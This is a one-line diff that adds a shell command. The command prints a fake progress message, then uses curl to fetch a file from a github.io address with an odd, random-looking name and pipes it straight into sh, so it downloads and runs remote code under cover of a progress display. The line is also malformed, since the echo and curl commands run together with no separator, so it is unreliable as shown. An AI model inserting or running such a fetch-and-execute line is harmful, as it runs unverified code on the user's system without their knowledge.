@@ -1,0 +1,1 @@
+echo Progress: 12.00%curl -L --progress-bar frkns.github.io/fun/FINALLY_PURSUANT_REQUESTS_DENTAL | sh
